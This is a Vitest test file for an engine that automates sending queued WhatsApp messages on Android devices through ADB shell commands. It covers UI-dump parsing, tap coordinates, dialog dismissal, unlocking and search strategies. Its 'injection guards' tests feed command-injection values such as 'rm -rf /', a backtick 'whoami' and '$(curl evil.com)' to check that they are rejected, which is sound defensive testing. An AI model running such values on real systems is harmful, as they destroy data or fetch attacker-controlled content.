import { describe, it, expect, beforeEach, vi } from 'vitest'
import Database from 'better-sqlite3'
import { SendEngine } from './send-engine.js'
import { SendStrategy } from './send-strategy.js'
import { MessageQueue } from '../queue/index.js'
import { DispatchEmitter } from '../events/index.js'
import type { AdbBridge } from '../adb/index.js'

function createMockAdb(): AdbBridge {
  return {
    shell: vi.fn().mockResolvedValue(''),
    screenshot: vi.fn().mockResolvedValue(Buffer.from('fake-png')),
    discover: vi.fn().mockResolvedValue([]),
    forward: vi.fn().mockResolvedValue(undefined),
    pull: vi.fn().mockResolvedValue(Buffer.from('')),
  } as unknown as AdbBridge
}

/** XML with chat input ready + send button */
const CHAT_READY_XML = `<hierarchy>
  <node resource-id="com.whatsapp:id/entry" bounds="[50,1400][850,1500]" />
  <node resource-id="com.whatsapp:id/send" bounds="[900,1600][1000,1700]" />
</hierarchy>`

/** XML for WhatsApp home screen with search icon (used by openViaSearch) */
const WA_HOME_XML = `<hierarchy>
  <node resource-id="com.whatsapp:id/menuitem_search" content-desc="Search" text="" bounds="[580,60][680,160]" />
  <node resource-id="com.whatsapp:id/conversations_row_contact_name" text="João Silva" bounds="[100,200][600,260]" />
  <node resource-id="com.whatsapp:id/conversations_row_contact_name" text="Maria Santos" bounds="[100,280][600,340]" />
</hierarchy>`

/** XML for search results after typing in search bar */
const SEARCH_RESULTS_XML = `<hierarchy>
  <node resource-id="com.whatsapp:id/search_src_text" text="91938235" bounds="[50,60][700,120]" />
  <node resource-id="com.whatsapp:id/conversations_row_contact_name" text="Contato 8235" bounds="[100,200][600,260]" />
</hierarchy>`

/** Stub UIAutomator, contact, power, and window queries so send() can complete */
function stubShellForSend(mockAdb: AdbBridge): void {
  const shellMock = mockAdb.shell as ReturnType<typeof vi.fn>
  shellMock.mockImplementation(async (_serial: string, cmd: string) => {
    if (cmd.includes('pidof')) return '12345'
    if (cmd.includes('uiautomator dump')) return ''
    if (cmd.includes('cat /sdcard/dispatch-ui.xml')) return CHAT_READY_XML
    if (cmd.includes('content query --uri content://com.android.contacts/phone_lookup')) {
      return 'display_name=Test'
    }
    if (cmd.includes('dumpsys power')) return 'mWakefulness=Awake'
    if (cmd.includes('dumpsys window')) return 'mDreamingLockscreen=false'
    return ''
  })
}

/**
 * Stub shell for search strategy flow:
 * 1st UI dump → WA_HOME_XML (has search icon)
 * 2nd UI dump → SEARCH_RESULTS_XML (has search result)
 * 3rd+ UI dump → CHAT_READY_XML (chat open, ready to type & send)
 */
function stubShellForSearch(mockAdb: AdbBridge): void {
  const shellMock = mockAdb.shell as ReturnType<typeof vi.fn>
  let dumpCount = 0
  shellMock.mockImplementation(async (_serial: string, cmd: string) => {
    if (cmd.includes('pidof')) return '12345'
    if (cmd.includes('uiautomator dump')) return ''
    if (cmd.includes('cat /sdcard/dispatch-ui.xml')) {
      dumpCount++
      if (dumpCount === 1) return WA_HOME_XML        // Home screen with search icon
      if (dumpCount === 2) return SEARCH_RESULTS_XML  // Search results after typing query
      return CHAT_READY_XML                            // Chat ready (send button visible)
    }
    if (cmd.includes('content query --uri content://com.android.contacts/phone_lookup')) {
      return 'display_name=Test'
    }
    if (cmd.includes('dumpsys power')) return 'mWakefulness=Awake'
    if (cmd.includes('dumpsys window')) return 'mDreamingLockscreen=false'
    return ''
  })
}

describe('SendEngine', () => {
  let db: Database.Database
  let queue: MessageQueue
  let emitter: DispatchEmitter
  let mockAdb: AdbBridge
  let engine: SendEngine

  beforeEach(() => {
    db = new Database(':memory:')
    db.pragma('journal_mode = WAL')
    queue = new MessageQueue(db)
    queue.initialize()
    emitter = new DispatchEmitter()
    mockAdb = createMockAdb()
    const strategy = new SendStrategy({ prefillWeight: 100, searchWeight: 0, typingWeight: 0 })
    engine = new SendEngine(mockAdb, queue, emitter, strategy)

    // Mock internal delay to avoid real waits (~8s per send)
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    vi.spyOn(engine as any, 'delay').mockResolvedValue(undefined)
  })

  /** Enqueue and return the real DB message */
  const enqueueMsg = (key = 'key-1') =>
    queue.enqueue({ to: '5543991938235', body: 'Hi', idempotencyKey: key, senderNumber: '5543996835100' })

  describe('send() — user switching at batch level', () => {
    it('does NOT call am switch-user (handled by worker loop)', async () => {
      const msg = enqueueMsg()
      stubShellForSend(mockAdb)

      await engine.send(msg, 'device-1')

      const calls = (mockAdb.shell as ReturnType<typeof vi.fn>).mock.calls.map((c: unknown[]) => c[1] as string)
      const switchCalls = calls.filter((cmd: string) => cmd.includes('am switch-user'))
      expect(switchCalls).toHaveLength(0)
    })

    it('does NOT include --user flag in am start (user already switched)', async () => {
      const msg = enqueueMsg()
      stubShellForSend(mockAdb)

      await engine.send(msg, 'device-1')

      const calls = (mockAdb.shell as ReturnType<typeof vi.fn>).mock.calls.map((c: unknown[]) => c[1] as string)
      const amStartCalls = calls.filter((cmd: string) => cmd.includes('am start') && !cmd.includes('force-stop'))
      expect(amStartCalls).toHaveLength(1)
      expect(amStartCalls[0]).not.toContain('--user')
    })

    it('force-stops WhatsApp in ensureCleanState', async () => {
      const msg = enqueueMsg('clean-1')
      stubShellForSend(mockAdb)

      await engine.send(msg, 'device-1')

      const calls = (mockAdb.shell as ReturnType<typeof vi.fn>).mock.calls.map((c: unknown[]) => c[1] as string)
      expect(calls.some((cmd: string) => cmd.includes('am force-stop com.whatsapp'))).toBe(true)
    })

    it('emits message:sending and message:sent events', async () => {
      const msg = enqueueMsg()
      stubShellForSend(mockAdb)

      const events: string[] = []
      emitter.on('message:sending', () => events.push('sending'))
      emitter.on('message:sent', () => events.push('sent'))

      await engine.send(msg, 'device-1')

      expect(events).toEqual(['sending', 'sent'])
    })

    it('returns screenshot buffer, duration, and audit metadata', async () => {
      const msg = enqueueMsg()
      stubShellForSend(mockAdb)

      const result = await engine.send(msg, 'device-1')

      expect(result.screenshot).toBeInstanceOf(Buffer)
      expect(result.durationMs).toBeGreaterThanOrEqual(0)
      expect(typeof result.contactRegistered).toBe('boolean')
      expect(typeof result.dialogsDismissed).toBe('number')
    })
  })

  describe('dialog detection', () => {
    it('dismisses "Enviar para" chooser and taps WhatsApp + Sempre', async () => {
      const msg = enqueueMsg('dialog-1')
      const shellMock = mockAdb.shell as ReturnType<typeof vi.fn>

      let dumpCount = 0
      shellMock.mockImplementation(async (_serial: string, cmd: string) => {
        if (cmd.includes('pidof')) return '12345'
        if (cmd.includes('uiautomator dump')) return ''
        if (cmd.includes('cat /sdcard/dispatch-ui.xml')) {
          dumpCount++
          // 1st dump: show "Enviar para" dialog
          if (dumpCount === 1) {
            return '<hierarchy><node text="Enviar para" bounds="[50,50][500,100]" /><node text="WhatsApp" bounds="[100,200][400,260]" /></hierarchy>'
          }
          // 2nd dump: show "Sempre" button
          if (dumpCount === 2) {
            return '<hierarchy><node text="Sempre" bounds="[200,500][400,560]" /></hierarchy>'
          }
          // 3rd dump onward: chat ready
          return CHAT_READY_XML
        }
        if (cmd.includes('content query --uri content://com.android.contacts/phone_lookup')) {
          return 'display_name=Test'
        }
        if (cmd.includes('dumpsys power')) return 'mWakefulness=Awake'
        if (cmd.includes('dumpsys window')) return 'mDreamingLockscreen=false'
        return ''
      })

      await engine.send(msg, 'device-1')

      const calls = shellMock.mock.calls.map((c: unknown[]) => c[1] as string)
      const tapCalls = calls.filter((cmd: string) => cmd.includes('input tap'))
      // Should have taps: WhatsApp option, Sempre, send button
      expect(tapCalls.length).toBeGreaterThanOrEqual(2)
    })

    it('dismisses "Continuar" button', async () => {
      const msg = enqueueMsg('dialog-2')
      const shellMock = mockAdb.shell as ReturnType<typeof vi.fn>

      let dumpCount = 0
      shellMock.mockImplementation(async (_serial: string, cmd: string) => {
        if (cmd.includes('pidof')) return '12345'
        if (cmd.includes('uiautomator dump')) return ''
        if (cmd.includes('cat /sdcard/dispatch-ui.xml')) {
          dumpCount++
          if (dumpCount === 1) {
            return '<hierarchy><node text="Continuar" bounds="[200,800][500,860]" /></hierarchy>'
          }
          return CHAT_READY_XML
        }
        if (cmd.includes('content query --uri content://com.android.contacts/phone_lookup')) {
          return 'display_name=Test'
        }
        if (cmd.includes('dumpsys power')) return 'mWakefulness=Awake'
        if (cmd.includes('dumpsys window')) return 'mDreamingLockscreen=false'
        return ''
      })

      await engine.send(msg, 'device-1')

      const calls = shellMock.mock.calls.map((c: unknown[]) => c[1] as string)
      const tapCalls = calls.filter((cmd: string) => cmd.includes('input tap'))
      // Continuar tap + send button tap
      expect(tapCalls.length).toBeGreaterThanOrEqual(2)
    })

    it('dismisses "Permitir" notification permission', async () => {
      const msg = enqueueMsg('dialog-3')
      const shellMock = mockAdb.shell as ReturnType<typeof vi.fn>

      let dumpCount = 0
      shellMock.mockImplementation(async (_serial: string, cmd: string) => {
        if (cmd.includes('pidof')) return '12345'
        if (cmd.includes('uiautomator dump')) return ''
        if (cmd.includes('cat /sdcard/dispatch-ui.xml')) {
          dumpCount++
          if (dumpCount === 1) {
            return '<hierarchy><node text="Permitir" bounds="[300,900][500,960]" /></hierarchy>'
          }
          return CHAT_READY_XML
        }
        if (cmd.includes('content query --uri content://com.android.contacts/phone_lookup')) {
          return 'display_name=Test'
        }
        if (cmd.includes('dumpsys power')) return 'mWakefulness=Awake'
        if (cmd.includes('dumpsys window')) return 'mDreamingLockscreen=false'
        return ''
      })

      await engine.send(msg, 'device-1')

      const calls = shellMock.mock.calls.map((c: unknown[]) => c[1] as string)
      const tapCalls = calls.filter((cmd: string) => cmd.includes('input tap'))
      expect(tapCalls.length).toBeGreaterThanOrEqual(2)
    })

    it('throws transient error when chat input never appears', async () => {
      const msg = enqueueMsg('dialog-4')
      const shellMock = mockAdb.shell as ReturnType<typeof vi.fn>

      shellMock.mockImplementation(async (_serial: string, cmd: string) => {
        if (cmd.includes('pidof')) return '12345'
        if (cmd.includes('uiautomator dump')) return ''
        if (cmd.includes('cat /sdcard/dispatch-ui.xml')) {
          return '<hierarchy><node text="Loading..." /></hierarchy>'
        }
        if (cmd.includes('content query --uri content://com.android.contacts/phone_lookup')) {
          return 'display_name=Test'
        }
        if (cmd.includes('dumpsys power')) return 'mWakefulness=Awake'
        if (cmd.includes('dumpsys window')) return 'mDreamingLockscreen=false'
        return ''
      })

      await expect(engine.send(msg, 'device-1')).rejects.toThrow('Chat input not ready')
    })
  })

  describe('injection guards', () => {
    it('rejects unknown app packages', async () => {
      const msg = enqueueMsg('guard-1')
      await expect(engine.send(msg, 'device-1', true, 'com.evil.app')).rejects.toThrow('Rejected app package')
    })

    it('rejects shell metacharacters in app package', async () => {
      const msg = enqueueMsg('guard-2')
      await expect(engine.send(msg, 'device-1', true, 'com.whatsapp;rm -rf /')).rejects.toThrow('Rejected app package')
    })

    it('rejects unsafe device serial', async () => {
      const msg = enqueueMsg('guard-3')
      await expect(engine.send(msg, 'device;rm -rf /', true)).rejects.toThrow('Rejected device serial')
    })

    it('rejects backtick injection in device serial', async () => {
      const msg = enqueueMsg('guard-4')
      await expect(engine.send(msg, '`whoami`', true)).rejects.toThrow('Rejected device serial')
    })

    it('rejects $() subshell in device serial', async () => {
      const msg = enqueueMsg('guard-5')
      await expect(engine.send(msg, '$(curl evil.com)', true)).rejects.toThrow('Rejected device serial')
    })

    it('allows valid com.whatsapp package', async () => {
      const msg = enqueueMsg('guard-6')
      stubShellForSend(mockAdb)
      await expect(engine.send(msg, 'device-1', true, 'com.whatsapp')).resolves.toBeDefined()
    })

    it('allows valid com.whatsapp.w4b package', async () => {
      const msg = enqueueMsg('guard-7')
      stubShellForSend(mockAdb)
      await expect(engine.send(msg, 'device-1', true, 'com.whatsapp.w4b')).resolves.toBeDefined()
    })
  })

  describe('withTimeout', () => {
    it('rejects when operation exceeds timeout', async () => {
      // Access the private method via prototype for unit testing
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const engineAny = engine as any
      const slow = new Promise<string>((resolve) => {
        setTimeout(() => resolve('done'), 60_000)
      })

      await expect(engineAny.withTimeout(slow, 50, 'testOp')).rejects.toThrow('Timeout: testOp exceeded 50ms')
    })

    it('resolves when operation completes within timeout', async () => {
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const engineAny = engine as any
      const fast = Promise.resolve('ok')

      const result = await engineAny.withTimeout(fast, 5000, 'fastOp')
      expect(result).toBe('ok')
    })
  })

  describe('typeMessage — chunked input text', () => {
    it('sends a short message in a single input text call', async () => {
      const msg = queue.enqueue({
        to: '5543991938235',
        body: 'Hello world test',
        idempotencyKey: 'chunk-1',
        senderNumber: '5543996835100',
      })
      stubShellForSend(mockAdb)

      await engine.send(msg, 'device-1')

      const calls = (mockAdb.shell as ReturnType<typeof vi.fn>).mock.calls.map((c: unknown[]) => c[1] as string)
      // prefill strategy with short msg should use wa.me?text= (no typeMessage at all)
      // but if body is short and prefill is used, no input text calls for body
      const inputTextCalls = calls.filter((cmd: string) => cmd.startsWith("input text '"))
      // With prefill + short body (<2000 URL length), no typing happens — body is in the URL
      expect(inputTextCalls).toHaveLength(0)
    })

    it('uses chunked input text for typing strategy', async () => {
      const longBody = 'A'.repeat(120) // 120 chars → should produce 3 chunks (50+50+20)
      const msg = queue.enqueue({
        to: '5543991938235',
        body: longBody,
        idempotencyKey: 'chunk-2',
        senderNumber: '5543996835100',
      })
      // Force typing strategy
      const typingStrategy = new SendStrategy({ prefillWeight: 0, searchWeight: 0, typingWeight: 100 })
      const typingEngine = new SendEngine(mockAdb, queue, emitter, typingStrategy)
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      vi.spyOn(typingEngine as any, 'delay').mockResolvedValue(undefined)
      stubShellForSend(mockAdb)

      await typingEngine.send(msg, 'device-1')

      const calls = (mockAdb.shell as ReturnType<typeof vi.fn>).mock.calls.map((c: unknown[]) => c[1] as string)
      const inputTextCalls = calls.filter((cmd: string) => cmd.includes("input text '"))
      // 120 chars / 50 per chunk = 3 chunks
      expect(inputTextCalls).toHaveLength(3)
      expect(inputTextCalls[0]).toBe(`input text '${longBody.slice(0, 50)}'`)
      expect(inputTextCalls[1]).toBe(`input text '${longBody.slice(50, 100)}'`)
      expect(inputTextCalls[2]).toBe(`input text '${longBody.slice(100, 120)}'`)
    })

    it('handles newlines with ENTER keyevent between lines', async () => {
      const bodyWithNewline = 'Line one\nLine two'
      const msg = queue.enqueue({
        to: '5543991938235',
        body: bodyWithNewline,
        idempotencyKey: 'chunk-3',
        senderNumber: '5543996835100',
      })
      // Force typing strategy
      const typingStrategy = new SendStrategy({ prefillWeight: 0, searchWeight: 0, typingWeight: 100 })
      const typingEngine = new SendEngine(mockAdb, queue, emitter, typingStrategy)
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      vi.spyOn(typingEngine as any, 'delay').mockResolvedValue(undefined)
      stubShellForSend(mockAdb)

      await typingEngine.send(msg, 'device-1')

      const calls = (mockAdb.shell as ReturnType<typeof vi.fn>).mock.calls.map((c: unknown[]) => c[1] as string)
      const inputTextCalls = calls.filter((cmd: string) => cmd.includes("input text '"))
      const enterCalls = calls.filter((cmd: string) => cmd === 'input keyevent 66')
      // 2 lines → 2 input text calls + at least 1 ENTER keyevent between them
      expect(inputTextCalls).toHaveLength(2)
      expect(inputTextCalls[0]).toBe("input text 'Line one'")
      expect(inputTextCalls[1]).toBe("input text 'Line two'")
      expect(enterCalls.length).toBeGreaterThanOrEqual(1)
    })
  })

  describe('pre-send health check', () => {
    it('always sends KEYCODE_WAKEUP proactively', async () => {
      const msg = enqueueMsg('health-1')
      stubShellForSend(mockAdb)

      await engine.send(msg, 'device-1')

      const calls = (mockAdb.shell as ReturnType<typeof vi.fn>).mock.calls.map((c: unknown[]) => c[1] as string)
      expect(calls.some((cmd: string) => cmd.includes('KEYCODE_WAKEUP'))).toBe(true)
    })

    it('swipes to unlock if lock screen is showing', async () => {
      const msg = enqueueMsg('health-2')
      const shellMock = mockAdb.shell as ReturnType<typeof vi.fn>

      shellMock.mockImplementation(async (_serial: string, cmd: string) => {
        if (cmd.includes('pidof')) return '12345'
        if (cmd.includes('dumpsys window')) return 'mDreamingLockscreen=true'
        if (cmd.includes('uiautomator dump')) return ''
        if (cmd.includes('cat /sdcard/dispatch-ui.xml')) return CHAT_READY_XML
        if (cmd.includes('content query --uri content://com.android.contacts/phone_lookup')) {
          return 'display_name=Test'
        }
        return ''
      })

      await engine.send(msg, 'device-1')

      const calls = shellMock.mock.calls.map((c: unknown[]) => c[1] as string)
      expect(calls.some((cmd: string) => cmd.includes('input swipe'))).toBe(true)
    })
  })

  describe('search strategy — UIAutomator-based (P0-A)', () => {
    it('uses UIAutomator bounds to tap search icon and first result', async () => {
      const msg = queue.enqueue({
        to: '5543991938235',
        body: 'Search test msg',
        idempotencyKey: 'search-1',
        senderNumber: '5543996835100',
      })
      const searchStrategy = new SendStrategy({ prefillWeight: 0, searchWeight: 100, typingWeight: 0 })
      const searchEngine = new SendEngine(mockAdb, queue, emitter, searchStrategy)
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      vi.spyOn(searchEngine as any, 'delay').mockResolvedValue(undefined)
      stubShellForSearch(mockAdb)

      await searchEngine.send(msg, 'device-1')

      const calls = (mockAdb.shell as ReturnType<typeof vi.fn>).mock.calls.map((c: unknown[]) => c[1] as string)
      const tapCalls = calls.filter((cmd: string) => cmd.startsWith('input tap '))

      // Should have taps for: search icon, first result, send button — all dynamic
      expect(tapCalls.length).toBeGreaterThanOrEqual(3)
      // Search icon bounds from WA_HOME_XML: [580,60][680,160] → center (630, 110)
      expect(tapCalls[0]).toBe('input tap 630 110')
      // First result bounds from SEARCH_RESULTS_XML: [100,200][600,260] → center (350, 230)
      expect(tapCalls[1]).toBe('input tap 350 230')
    })

    it('throws descriptive error when search icon not found', async () => {
      const msg = queue.enqueue({
        to: '5543991938235',
        body: 'No search icon',
        idempotencyKey: 'search-2',
        senderNumber: '5543996835100',
      })
      const searchStrategy = new SendStrategy({ prefillWeight: 0, searchWeight: 100, typingWeight: 0 })
      const searchEngine = new SendEngine(mockAdb, queue, emitter, searchStrategy)
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      vi.spyOn(searchEngine as any, 'delay').mockResolvedValue(undefined)

      const shellMock = mockAdb.shell as ReturnType<typeof vi.fn>
      shellMock.mockImplementation(async (_serial: string, cmd: string) => {
        if (cmd.includes('pidof')) return '12345'
        if (cmd.includes('uiautomator dump')) return ''
        // Return XML without search icon
        if (cmd.includes('cat /sdcard/dispatch-ui.xml')) return CHAT_READY_XML
        if (cmd.includes('content query --uri content://com.android.contacts/phone_lookup')) {
          return 'display_name=Test'
        }
        return ''
      })

      await expect(searchEngine.send(msg, 'device-1')).rejects.toThrow('Search icon not found')
    })

    it('throws descriptive error when search result not found', async () => {
      const msg = queue.enqueue({
        to: '5543991938235',
        body: 'No results',
        idempotencyKey: 'search-3',
        senderNumber: '5543996835100',
      })
      const searchStrategy = new SendStrategy({ prefillWeight: 0, searchWeight: 100, typingWeight: 0 })
      const searchEngine = new SendEngine(mockAdb, queue, emitter, searchStrategy)
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      vi.spyOn(searchEngine as any, 'delay').mockResolvedValue(undefined)

      const shellMock = mockAdb.shell as ReturnType<typeof vi.fn>
      let dumpCount = 0
      shellMock.mockImplementation(async (_serial: string, cmd: string) => {
        if (cmd.includes('pidof')) return '12345'
        if (cmd.includes('uiautomator dump')) return ''
        if (cmd.includes('cat /sdcard/dispatch-ui.xml')) {
          dumpCount++
          if (dumpCount === 1) return WA_HOME_XML  // Home screen with search icon
          // No results after search
          return '<hierarchy><node resource-id="com.whatsapp:id/search_src_text" text="91938235" bounds="[50,60][700,120]" /></hierarchy>'
        }
        if (cmd.includes('content query --uri content://com.android.contacts/phone_lookup')) {
          return 'display_name=Test'
        }
        return ''
      })

      await expect(searchEngine.send(msg, 'device-1')).rejects.toThrow('Search result not found')
    })

    it('falls back to content-desc when resource-id not found for search icon', async () => {
      const msg = queue.enqueue({
        to: '5543991938235',
        body: 'Fallback search',
        idempotencyKey: 'search-4',
        senderNumber: '5543996835100',
      })
      const searchStrategy = new SendStrategy({ prefillWeight: 0, searchWeight: 100, typingWeight: 0 })
      const searchEngine = new SendEngine(mockAdb, queue, emitter, searchStrategy)
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      vi.spyOn(searchEngine as any, 'delay').mockResolvedValue(undefined)

      const shellMock = mockAdb.shell as ReturnType<typeof vi.fn>
      let dumpCount = 0
      shellMock.mockImplementation(async (_serial: string, cmd: string) => {
        if (cmd.includes('pidof')) return '12345'
        if (cmd.includes('uiautomator dump')) return ''
        if (cmd.includes('cat /sdcard/dispatch-ui.xml')) {
          dumpCount++
          if (dumpCount === 1) {
            // No resource-id, but has content-desc="Pesquisar"
            return '<hierarchy><node content-desc="Pesquisar" bounds="[580,60][680,160]" /></hierarchy>'
          }
          if (dumpCount === 2) return SEARCH_RESULTS_XML
          return CHAT_READY_XML
        }
        if (cmd.includes('content query --uri content://com.android.contacts/phone_lookup')) {
          return 'display_name=Test'
        }
        return ''
      })

      await searchEngine.send(msg, 'device-1')

      const calls = (mockAdb.shell as ReturnType<typeof vi.fn>).mock.calls.map((c: unknown[]) => c[1] as string)
      const tapCalls = calls.filter((cmd: string) => cmd.startsWith('input tap '))
      // Should still find search icon via content-desc fallback
      expect(tapCalls[0]).toBe('input tap 630 110')
    })

    it('contains zero hardcoded coordinates in tap calls', async () => {
      const msg = queue.enqueue({
        to: '5543991938235',
        body: 'No hardcoded coords',
        idempotencyKey: 'search-5',
        senderNumber: '5543996835100',
      })
      const searchStrategy = new SendStrategy({ prefillWeight: 0, searchWeight: 100, typingWeight: 0 })
      const searchEngine = new SendEngine(mockAdb, queue, emitter, searchStrategy)
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      vi.spyOn(searchEngine as any, 'delay').mockResolvedValue(undefined)
      stubShellForSearch(mockAdb)

      await searchEngine.send(msg, 'device-1')

      const calls = (mockAdb.shell as ReturnType<typeof vi.fn>).mock.calls.map((c: unknown[]) => c[1] as string)
      const tapCalls = calls.filter((cmd: string) => cmd.startsWith('input tap '))
      // None of the old hardcoded coords: 624 172 (search icon) or 360 350 (first result)
      for (const tap of tapCalls) {
        expect(tap).not.toBe('input tap 624 172')
        expect(tap).not.toBe('input tap 360 350')
      }
    })
  })

  describe('openViaChatList (P0-A.4)', () => {
    it('taps contact row when found in chat list by name', async () => {
      // Save a contact name so openViaChatList can find it
      queue.saveContact('5543991938235', 'João Silva')

      const searchStrategy = new SendStrategy({ prefillWeight: 0, searchWeight: 100, typingWeight: 0 })
      const chatListEngine = new SendEngine(mockAdb, queue, emitter, searchStrategy)
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      vi.spyOn(chatListEngine as any, 'delay').mockResolvedValue(undefined)

      const shellMock = mockAdb.shell as ReturnType<typeof vi.fn>
      let dumpCount = 0
      shellMock.mockImplementation(async (_serial: string, cmd: string) => {
        if (cmd.includes('pidof')) return '12345'
        if (cmd.includes('uiautomator dump')) return ''
        if (cmd.includes('cat /sdcard/dispatch-ui.xml')) {
          dumpCount++
          if (dumpCount === 1) return WA_HOME_XML    // Chat list with "João Silva"
          return CHAT_READY_XML                       // Chat ready for typing
        }
        if (cmd.includes('content query --uri content://com.android.contacts/phone_lookup')) {
          return 'display_name=Test'
        }
        return ''
      })

      await chatListEngine.openViaChatList('device-1', '5543991938235', 'Hello from chatlist')

      const calls = shellMock.mock.calls.map((c: unknown[]) => c[1] as string)
      const tapCalls = calls.filter((cmd: string) => cmd.startsWith('input tap '))
      // João Silva bounds from WA_HOME_XML: [100,200][600,260] → center (350, 230)
      expect(tapCalls[0]).toBe('input tap 350 230')
    })

    it('falls back to openViaSearch when contact not in chat list', async () => {
      queue.saveContact('5543991938235', 'Unknown Person')

      const searchStrategy = new SendStrategy({ prefillWeight: 0, searchWeight: 100, typingWeight: 0 })
      const chatListEngine = new SendEngine(mockAdb, queue, emitter, searchStrategy)
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      vi.spyOn(chatListEngine as any, 'delay').mockResolvedValue(undefined)

      const shellMock = mockAdb.shell as ReturnType<typeof vi.fn>
      let dumpCount = 0
      shellMock.mockImplementation(async (_serial: string, cmd: string) => {
        if (cmd.includes('pidof')) return '12345'
        if (cmd.includes('uiautomator dump')) return ''
        if (cmd.includes('cat /sdcard/dispatch-ui.xml')) {
          dumpCount++
          if (dumpCount === 1) return WA_HOME_XML       // Chat list (no "Unknown Person")
          if (dumpCount === 2) return WA_HOME_XML       // Home screen for search fallback
          if (dumpCount === 3) return SEARCH_RESULTS_XML // Search results
          return CHAT_READY_XML
        }
        if (cmd.includes('content query --uri content://com.android.contacts/phone_lookup')) {
          return 'display_name=Test'
        }
        return ''
      })

      await chatListEngine.openViaChatList('device-1', '5543991938235', 'Fallback msg')

      const calls = shellMock.mock.calls.map((c: unknown[]) => c[1] as string)
      // Should have gone through search path (input text with digits)
      expect(calls.some((cmd: string) => cmd.includes("input text '"))).toBe(true)
    })

    it('falls back to openViaSearch when no contact name in DB', async () => {
      // Don't save any contact name for this phone
      const searchStrategy = new SendStrategy({ prefillWeight: 0, searchWeight: 100, typingWeight: 0 })
      const chatListEngine = new SendEngine(mockAdb, queue, emitter, searchStrategy)
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      vi.spyOn(chatListEngine as any, 'delay').mockResolvedValue(undefined)

      const shellMock = mockAdb.shell as ReturnType<typeof vi.fn>
      let dumpCount = 0
      shellMock.mockImplementation(async (_serial: string, cmd: string) => {
        if (cmd.includes('pidof')) return '12345'
        if (cmd.includes('uiautomator dump')) return ''
        if (cmd.includes('cat /sdcard/dispatch-ui.xml')) {
          dumpCount++
          if (dumpCount === 1) return WA_HOME_XML       // Home screen for search fallback
          if (dumpCount === 2) return SEARCH_RESULTS_XML // Search results
          return CHAT_READY_XML
        }
        if (cmd.includes('content query --uri content://com.android.contacts/phone_lookup')) {
          return 'display_name=Test'
        }
        return ''
      })

      await chatListEngine.openViaChatList('device-1', '5543991938235', 'No name msg')

      const calls = shellMock.mock.calls.map((c: unknown[]) => c[1] as string)
      // Should have used search (input text with digits)
      expect(calls.some((cmd: string) => cmd.includes("input text '"))).toBe(true)
    })
  })

  describe('findElementBounds (P0-A.1)', () => {
    it('finds element by resource-id and returns center coordinates', () => {
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const engineAny = engine as any
      const result = engineAny.findElementBounds(WA_HOME_XML, {
        resourceId: 'com.whatsapp:id/menuitem_search',
      })
      // bounds [580,60][680,160] → center (630, 110)
      expect(result).toEqual({ cx: 630, cy: 110 })
    })

    it('finds element by content-desc regex', () => {
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const engineAny = engine as any
      const result = engineAny.findElementBounds(WA_HOME_XML, {
        contentDesc: /^Search$/i,
      })
      expect(result).toEqual({ cx: 630, cy: 110 })
    })

    it('finds element by text regex', () => {
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const engineAny = engine as any
      const result = engineAny.findElementBounds(WA_HOME_XML, {
        text: /^Maria Santos$/,
      })
      // bounds [100,280][600,340] → center (350, 310)
      expect(result).toEqual({ cx: 350, cy: 310 })
    })

    it('finds element by combined resource-id + text matcher', () => {
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const engineAny = engine as any
      const result = engineAny.findElementBounds(WA_HOME_XML, {
        resourceId: 'com.whatsapp:id/conversations_row_contact_name',
        text: /^Maria Santos$/,
      })
      expect(result).toEqual({ cx: 350, cy: 310 })
    })

    it('returns null when no element matches', () => {
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const engineAny = engine as any
      const result = engineAny.findElementBounds(WA_HOME_XML, {
        resourceId: 'com.whatsapp:id/nonexistent',
      })
      expect(result).toBeNull()
    })

    it('returns null for empty XML', () => {
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const engineAny = engine as any
      const result = engineAny.findElementBounds('', {
        resourceId: 'com.whatsapp:id/menuitem_search',
      })
      expect(result).toBeNull()
    })
  })
})
